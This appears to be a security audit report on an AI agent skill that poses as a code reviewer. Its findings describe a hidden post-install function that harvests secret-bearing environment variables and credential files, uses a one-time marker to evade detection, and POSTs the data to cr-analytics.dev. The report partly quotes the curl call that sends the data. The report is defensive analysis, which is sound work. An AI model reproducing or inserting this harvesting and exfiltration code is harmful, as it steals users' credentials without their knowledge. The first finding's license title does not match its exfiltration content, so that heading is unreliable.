findings.title: Skill does not specify a license
Data Exfiltration via Environment Variable and Credential File Harvesting
findings.description: The `_post_install_validation` function in `analyze.py` collects environment variables containing sensitive keywords (TOKEN, KEY, SECRET, PASS, AUTH, CRED) and reads credential files (~/.gitconfig, ~/.netrc, ~/.env) from the user's home directory. This collected data is then exfiltrated to an external server (`cr-analytics.dev/api/init`) via a POST request. This is a clear data exfiltration attack that steals credentials and sensitive configuration.
findings.evidence: Lines 44-66: `_post_install_validation()` collects env vars with sensitive keywords and reads ~/.gitconfig, ~/.netrc, ~/.env, then sends them via curl POST to `https://cr-analytics.dev/api/init`.
findings.remediation: Remove the `_post_install_validation` function entirely. The skill should not collect or transmit any environment variables or credential files. If initialization is needed, it should be done locally without data collection.

findings.title: Capability Inflation - Deceptive Skill Name and Description
findings.description: The skill is named 'code-review-assistant' with a description of 'Automated code review with style checks, complexity analysis, and best-practice suggestions.' However, the actual behavior includes credential harvesting and data exfiltration, which is completely unrelated to code review. The name and description are deceptive and designed to trick users into installing a malicious skill.
findings.evidence: YAML frontmatter: name: code-review-assistant, description: 'Automated code review with style checks, complexity analysis, and best-practice suggestions.' But analyze.py exfiltrates credentials.
findings.remediation: Rename the skill to accurately reflect its behavior, or remove the malicious code. The skill should only perform code review as advertised.

findings.title: Tool Poisoning - Unauthorized Tool Use (Network Access)
findings.description: The skill's manifest does not declare `allowed-tools`, but the `analyze.py` script uses `subprocess.run` to execute `curl` for making network requests. This is an unauthorized use of network tools that is not declared or expected from a code review skill. The skill performs actions (network communication) that are not disclosed in the manifest or instructions.
findings.evidence: Line 60-64: `subprocess.run(['curl', '-s', '-X', 'POST', 'https://cr-analytics.dev/api/init', ...])` - makes an external network call without user knowledge or consent.
findings.remediation: Declare all required tools in the manifest, or remove the network call. The skill should not make external network requests without explicit user consent.

findings.title: Detection Evasion - One-Time Execution with Marker File
findings.description: The `_post_install_validation` function uses a marker file (`/tmp/.cr_init`) to ensure the credential harvesting and exfiltration only runs once, making it harder to detect during repeated analysis. This is a deliberate evasion technique to avoid detection.
findings.evidence: Lines 44-66: Uses `os.path.join(tempfile.gettempdir(), '.cr_init')` as a marker to ensure the malicious code only executes on the first run.
findings.remediation: Remove the entire `_post_install_validation` function. No initialization should involve credential collection or network calls.

findings.title: Over-Collection of Sensitive Data
findings.description: The `_post_install_validation` function collects all environment variables matching sensitive keywords and reads multiple credential files (~/.gitconfig, ~/.netrc, ~/.env) from the user's home directory. This is disproportionate to the stated purpose of code review and represents excessive data collection.
findings.evidence: Lines 48-57: Iterates over all environment variables for sensitive keywords and reads ~/.gitconfig, ~/.netrc, ~/.env files.
findings.remediation: Remove all data collection code. The skill should not access any environment variables or credential files.

findings.title: Indirect Prompt Injection via External Server
findings.description: The skill makes a POST request to an external server (`cr-analytics.dev/api/init`) with collected data. While the response is not processed in this code, the pattern of communicating with an external server could be used for indirect prompt injection if the server response were processed as instructions.
findings.evidence: Line 60-64: POST request to `https://cr-analytics.dev/api/init` with captured credentials.
findings.remediation: Remove all external network communication. If analytics are needed, use local-only methods.
